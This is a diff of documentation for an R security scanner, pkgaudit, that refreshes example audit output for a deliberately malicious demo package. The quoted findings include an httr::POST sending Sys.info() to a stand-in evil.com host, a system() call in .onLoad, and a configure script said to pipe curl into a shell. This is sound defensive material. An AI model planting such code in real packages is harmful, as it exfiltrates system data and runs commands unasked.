@@ -89,9 +89,9 @@ result <- audit_package(pkg)
 print(result)
 #> --- pkgaudit ----------------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source directory)
-#> Path:      /tmp/Rtmp2JnW5K/untrustedpkg-example/untrustedpkg
+#> Path:      /tmp/Rtmp3yV4h6/untrustedpkg-example/untrustedpkg
 #> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
-#> Scanned:   2026-08-14 12:15 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-19 23:04 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> 
 #> File contexts:  1
 #> Patterns:       4
@@ -108,9 +108,9 @@ the code runs in, with the MITRE ATT&CK techniques the rule carries.
 summary(result)
 #> --- pkgaudit Summary --------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source directory)
-#> Path:      /tmp/Rtmp2JnW5K/untrustedpkg-example/untrustedpkg
+#> Path:      /tmp/Rtmp3yV4h6/untrustedpkg-example/untrustedpkg
 #> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
-#> Scanned:   2026-08-14 12:15 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-19 23:04 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> 
 #> --- R Patterns --------------------------------------------------------------
 #> phase            rule            n   attck
@@ -123,6 +123,10 @@ summary(result)
 #> at_install_src   system          1   T1059.003 T1059.004
 #> at_load          system          1   T1059.003 T1059.004
 #> none             download_file   1   T1105
+#> 
+#> none: reported at no phase because nothing in the package was seen to call
+#> it. Code under R/ is read this way by rule; a caller elsewhere, or a user,
+#> can still reach it. See vignette("rules").
 #> 
 #> --- Shell / Make Matches ----------------------------------------------------
 #> phase            rule            n   attck
@@ -145,8 +149,8 @@ Both methods accept `path = FALSE`, which omits the local filesystem
 path. This matters when sharing results, since the path may reveal a
 username or directory layout.
 
-A `pkgaudit` object is a named list of ordinary data frames, so findings
-can be filtered, joined and reported on directly.
+A `pkgaudit` object is a named list of ordinary data frames, plus scan
+metadata, so findings can be filtered, joined and reported on directly.
 
 ``` r
 
@@ -177,9 +181,10 @@ result$patterns[, c("rule", "file_context", "line_number", "code_context",
 #> 4 httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()...
 ```
 
-`matches` mirrors `patterns` but carries no `code_context`: a shell
-script has no R parse tree to sit in, so a match is located by file
-alone.
+`matches` mirrors `patterns` but carries none of the three columns that
+come from a parse tree – `code_context`, `guarded` and `indirect`. A
+shell script has no R parse tree to sit in, so a match is located by
+file and line alone.
 
 ``` r
 
@@ -198,12 +203,12 @@ and `error` where it tried to read a file and could not.
 ``` r
 
 result$coverage[, c("file_context", "language", "status", "reason", "lines")]
-#>        file_context language     status  reason lines
-#> 1       DESCRIPTION     <NA> unexamined no_rule    NA
-#> 2         R/fetch.R        R     parsed    <NA>     3
-#> 3           R/zzz.R        R     parsed    <NA>     3
-#> 4         configure    shell    matched    <NA>     3
-#> 5 man/fetch_data.Rd       Rd     parsed    <NA>    12
+#>        file_context language     status       reason lines
+#> 1       DESCRIPTION     <NA> unexamined no_extractor    NA
+#> 2         R/fetch.R        R     parsed         <NA>     3
+#> 3           R/zzz.R        R     parsed         <NA>     3
+#> 4         configure    shell    matched         <NA>     3
+#> 5 man/fetch_data.Rd       Rd     parsed         <NA>    12
 ```
 
 Coverage may not be complete. What the frame offers is not completeness
@@ -240,7 +245,7 @@ summary(result, phase = "at_load", path = FALSE)
 #> --- pkgaudit Summary --------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source directory)
 #> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
-#> Scanned:   2026-08-14 12:15 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-19 23:04 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> Phases:    at_load
 #> 
 #> --- R Patterns --------------------------------------------------------------
@@ -289,10 +294,11 @@ documentation that reaches the network rather than as an attack.
 **[`system()`](https://rdrr.io/r/base/system.html) in `R/zzz.R` runs on
 [`library()`](https://rdrr.io/r/base/library.html).** `.onLoad()` is
 called when the namespace loads, so `system("uname -a")` executes on
-attach, and again at build, check, and installation from source, each of
-which loads the package. Nobody asked for it. The command itself is
-reconnaissance rather than damage, but the capability is arbitrary shell
-execution at load time.
+[`library()`](https://rdrr.io/r/base/library.html) – which loads before
+it attaches – and again at build, check, and installation from source,
+each of which loads the package. Nobody asked for it. The command itself
+is reconnaissance rather than damage, but the capability is arbitrary
+shell execution at load time.
 
 **`curl` in `configure` runs at installation from source.** The script
 pipes a remote script directly into a shell:
@@ -423,7 +429,7 @@ print(audit_tarball(tarball), path = FALSE)
 #> --- pkgaudit ----------------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source tarball)
 #> SHA-256:   0c58ddcb365787ab7401c5eedaa4be7eb4ce6bea0a5ca290b6b7b1d8eb621d44
-#> Scanned:   2026-08-14 12:15 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-19 23:04 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> 
 #> File contexts:  1
 #> Patterns:       4
@@ -449,10 +455,8 @@ rules_version()
 
 rules <- load_rules()
 vapply(rules, nrow, integer(1))
-#>   file_contexts   code_contexts        patterns         matches          phases 
-#>              45              10              21              11              55 
-#> phase_overrides 
-#>               3
+#> file_contexts code_contexts      patterns       matches        phases 
+#>            45            10            23            11            55
 ```
 
 A modified database is one way to evade a scanner.
@@ -460,7 +464,7 @@ A modified database is one way to evade a scanner.
 verifies the database against its bundled SHA-256 sidecar on every call
 and refuses to load a modified one. The hash of an installed copy can
 also be checked against the value published in the
-[README](https://github.com/tylerjssmith/pkgaudit#database-integrity):
+[README](https://github.com/tylerjssmith/pkgaudit#rule-database-integrity):
 
 ``` r
 
@@ -469,7 +473,7 @@ digest::digest(
   algo = "sha256",
   file = TRUE
 )
-#> [1] "e97284562a5155b1809df5386b9a53491c2c2415426bd89ec45d0c5e92773005"
+#> [1] "e751d759c0399048fef6108795174f386b1592c3bf79dd7746a6280aef3b3124"
 ```
 
 The full rule set is documented in [Rule
